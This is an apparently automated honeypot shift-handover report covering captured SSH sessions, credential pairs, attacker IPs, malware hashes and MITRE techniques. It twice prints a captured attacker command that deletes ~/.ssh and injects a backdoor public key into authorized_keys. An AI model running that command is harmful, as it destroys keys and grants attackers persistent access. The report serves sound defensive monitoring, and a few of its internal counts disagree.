# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-01 |
| **Generated At** | 2026-05-01T13:26:52Z |
| **Shift Time** | 13:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **739** |
| Confirmed Threats | **77** |
| False Positives Filtered | **662** (89.6%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **19** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **734** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **13** |
| Unique Credential Pairs | **12** |
| Unique Usernames | **7** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `ubuntu` | 3 |
| `345gs5662d34` | 1 |
| `` | 1 |
| `ts3srv` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `---fuck_you----` | 2 |
| `Password123` | 1 |
| `admin12` | 1 |
| `345gs5662d34` | 1 |
| `3245gs5662d34` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `---fuck_you----` | 2 |
| `ubuntu` | `Password123` | 1 |
| `root` | `admin12` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `root` | `3245gs5662d34` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `---fuck_you----` | `117.187.180.166` | 2026-05-01T11:44:32 |
| `root` | `admin12` | `103.13.206.100` | 2026-05-01T12:07:03 |
| `root` | `3245gs5662d34` | `103.13.206.100` | 2026-05-01T12:07:06 |
| `root` | `---fuck_you----` | `221.10.42.66` | 2026-05-01T12:16:07 |
| `root` | `------fuck------` | `116.169.221.109` | 2026-05-01T12:21:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **739** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| Go SSH scanner | 4 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 30 | 1 |
| `98f63c4d9c87...` | Generic scanner | 3 | 3 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `ec9ea89c70f5...` | Mirai/variant | 1 | 1 |
| `e788c657d1a2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 30 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `98f63c4d9c87...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `ec9ea89c70f5...` | OpenSSH | 1 | 1 | Mirai/variant |
| `e788c657d1a2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.13.206.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **30** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS51396` | Pfcloud UG | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS263025` | ISPTEC Sistemas de Comunicação Eireli | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |
| `AS208137` | Feo Prest SRL | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS55293` | A2 Hosting, Inc. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0e75a81d0e7f

| Field | Detail |
|---|---|
| **Source IP** | `117.187.180[.]166` |
| **First Seen** | 2026-05-01 11:44 |
| **Last Seen** | 2026-05-01 11:49 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:44:27` | `cowrie.session.connect` |
| `2026-05-01 11:44:27` | `cowrie.client.version` |
| `2026-05-01 11:44:31` | `cowrie.client.kex` |
| `2026-05-01 11:44:32` | `cowrie.login.success` |
| `2026-05-01 11:44:32` | `cowrie.session.params` |
| `2026-05-01 11:44:32` | `cowrie.command.input` |
| `2026-05-01 11:44:32` | `cowrie.log.closed` |
| `2026-05-01 11:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.187.180[.]166` to AbuseIPDB if not already reported
- [ ] Block `117.187.180[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac91575c367

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-05-01 12:07 |
| **Last Seen** | 2026-05-01 12:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 12:07:01` | `cowrie.session.connect` |
| `2026-05-01 12:07:01` | `cowrie.client.version` |
| `2026-05-01 12:07:01` | `cowrie.client.kex` |
| `2026-05-01 12:07:03` | `cowrie.login.success` |
| `2026-05-01 12:07:03` | `cowrie.session.params` |
| `2026-05-01 12:07:03` | `cowrie.command.input` |
| `2026-05-01 12:07:03` | `cowrie.command.failed` |
| `2026-05-01 12:07:03` | `cowrie.log.closed` |
| `2026-05-01 12:07:03` | `cowrie.session.params` |
| `2026-05-01 12:07:03` | `cowrie.command.input` |
| `2026-05-01 12:07:03` | `cowrie.session.file_download` |
| `2026-05-01 12:07:03` | `cowrie.log.closed` |
| `2026-05-01 12:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70dd15804d7d

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-05-01 12:07 |
| **Last Seen** | 2026-05-01 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 12:07:05` | `cowrie.session.connect` |
| `2026-05-01 12:07:05` | `cowrie.client.version` |
| `2026-05-01 12:07:05` | `cowrie.client.kex` |
| `2026-05-01 12:07:06` | `cowrie.login.success` |
| `2026-05-01 12:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149d73709e9e

| Field | Detail |
|---|---|
| **Source IP** | `221.10.42[.]66` |
| **First Seen** | 2026-05-01 12:16 |
| **Last Seen** | 2026-05-01 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 12:16:07` | `cowrie.session.connect` |
| `2026-05-01 12:16:07` | `cowrie.client.version` |
| `2026-05-01 12:16:07` | `cowrie.client.kex` |
| `2026-05-01 12:16:07` | `cowrie.login.success` |
| `2026-05-01 12:16:08` | `cowrie.session.params` |
| `2026-05-01 12:16:08` | `cowrie.command.input` |
| `2026-05-01 12:16:08` | `cowrie.log.closed` |
| `2026-05-01 12:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.10.42[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.10.42[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `218.78.132[.]164` | **30** | 2026-05-01 11:58 | 2026-05-01 12:27 | 47m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.43[.]68` | **19** | 2026-05-01 12:45 | 2026-05-01 12:49 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `216.237.208[.]129` | **4** | 2026-05-01 12:16 | 2026-05-01 12:24 | 8m | 0 | `T1592` | 🟢 LOW |
| `118.194.251[.]145` | **3** | 2026-05-01 11:10 | 2026-05-01 11:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]219` | **3** | 2026-05-01 11:13 | 2026-05-01 11:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]224` | **2** | 2026-05-01 13:11 | 2026-05-01 13:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]225` | **2** | 2026-05-01 13:11 | 2026-05-01 13:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]226` | **2** | 2026-05-01 13:11 | 2026-05-01 13:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.13.206[.]100` | 1 | 2026-05-01 12:07 | 2026-05-01 12:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.187.180[.]166` | 1 | 2026-05-01 11:44 | 2026-05-01 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `144.64.157[.]244` | 1 | 2026-05-01 12:42 | 2026-05-01 12:42 | 31s | 0 | `T1592` | 🟢 LOW |
| `175.208.192[.]186` | 1 | 2026-05-01 11:11 | 2026-05-01 11:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `18.215.159[.]152` | 1 | 2026-05-01 12:56 | 2026-05-01 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.108.64[.]6` | 1 | 2026-05-01 11:56 | 2026-05-01 11:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.188.199[.]136` | 1 | 2026-05-01 12:08 | 2026-05-01 12:08 | 16s | 1 | `T1110.001` | 🟢 LOW |
| `221.10.42[.]66` | 1 | 2026-05-01 12:16 | 2026-05-01 12:16 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `144.64.157[.]244` | PT | PT Comunicacoes S.A | **100** ⚠️ | 3 |
| `223.123.43[.]68` | PK | CMPak Limited | **100** ⚠️ | 48 |
| `175.208.192[.]186` | KR | Korea Telecom | **100** ⚠️ | 18 |
| `204.76.203[.]225` | NL | Intelligence Hosting LLC | **100** ⚠️ | 18 |
| `221.10.42[.]66` | CN | China Unicom SiChuan province network | **100** ⚠️ | 0 |
| `204.76.203[.]226` | NL | Intelligence Hosting LLC | **100** ⚠️ | 13 |
| `218.78.132[.]164` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `213.209.159[.]219` | DE | Feo Prest SRL | **100** ⚠️ | 0 |
| `180.108.64[.]6` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `18.215.159[.]152` | US | Amazon Technologies Inc. | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (662 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 64 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 586 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 739 cases |
| Tool 34  | Credential Extractor        | ✅ 13 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 662 filtered (89.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 16 recon entry/entries in table (8 group(s) consolidating 65 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-01T13:26:52Z_
